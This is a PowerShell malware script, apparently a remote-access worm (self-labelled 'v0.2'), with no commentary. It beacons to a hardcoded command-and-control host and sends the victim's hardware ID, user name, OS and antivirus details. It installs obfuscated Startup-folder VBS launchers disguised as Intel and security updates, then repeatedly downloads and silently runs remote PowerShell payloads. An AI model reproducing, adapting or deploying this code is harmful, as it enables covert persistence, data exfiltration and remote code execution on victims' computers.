Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic

$ErrorActionPreference = 'SilentlyContinue'
[System.String] $Host = 'rick63.publicvm.com'
[System.String] $Port = '1849'
[System.String] $Splitter = '|V|'

Function HTTP($DA, $Param) {
    [System.String] $Resp = [System.String]::Empty
    [System.Object] $Obj = [Microsoft.VisualBasic.Interaction]::CreateObject('Microsoft.XMLHTTP')
    try {
        $Obj.Open('POST', 'http://' + $Host + ':' + $Port + '/' + $DA, $false)
        $Obj.SetRequestHeader('User-Agent:', $UserInfo)
        $Obj.Send($Param)
        $Resp = [Convert]::ToString($Obj.ResponseText)
    }
    catch { }
    return $Resp
}

Function Info {
    [System.String] $UserID = HardwareID($env:computername)
    [System.String] $WormVersion = 'v0.2'
    [System.String] $UserOS = [Microsoft.VisualBasic.Strings]::Split((Get-WMIObject win32_operatingsystem).name,"|")[0] + " " + (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    [System.String] $UserAV = 'Windows Defender'
    return $UserID + '\' + ($env:COMPUTERNAME) + "\" + ($env:UserName) + '\' + $UserOS + '\' + $UserAV + '\' + 'Yes' + '\' + 'Yes' + '\' + 'False' + '\'
}

Function HardwareID($strComputer) {
    $ErrorActionPreference = 'SilentlyContinue'
    $lol = [System.Convert]::ToString((get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID))
    return ([Microsoft.VisualBasic.Strings]::Split($lol,'-')[0] + [Microsoft.VisualBasic.Strings]::Split($lol,'-')[1])
}

Function StartupInstall() {
    [String] $startup = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,66,66,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,79,66,66,46,82,117,110,32,34,80,111,119,101,114,83,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,82,101,109,111,116,101,83,105,103,110,101,100,32,45,70,105,108,101,32,34,43,34,37,70,73,76,69,37,34,44,48))
    [System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + '\IntelGraphicsDriverUpdates.vbs', $startup.Replace('%FILE%', $PSCommandPath))
}

StartupInstall
[System.String] $UserInfo = Info

DO {
    [System.String[]] $HP = [Microsoft.VisualBasic.Strings]::Split((HTTP("Vre", "")) , $Splitter)
    If ($HP[0] -eq 'TR') {
        [String] $PsFileName =  [System.Guid]::NewGuid().ToString().Replace("-", "") + ".PS1"
        [String] $StartupContent = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,87,115,104,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,87,115,104,83,104,101,108,108,46,82,117,110,32,34,80,111,119,101,114,115,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,66,121,112,97,115,115,32,45,70,105,108,101,32,34,32,43,32,34,37,80,84,37,34,44,32,48))
        $TargetPath = [System.IO.Path]::GetTempPath() + $PsFileName
        [System.IO.File]::WriteAllText($TargetPath, $A[1])
        [System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + "\HealthTraySecurityUpdates.vbs", $StartupContent.Replace("%PT%", $TargetPath))
        PowerShell -WindowStyle Hidden -ExecutionPolicy RemoteSigned -File $TargetPath
    }
    ElseIf ($HP[0] -eq 'Cl') {
        [Environment]::Exit(0)
    }
    [System.Threading.Thread]::Sleep(5000)
} While($true)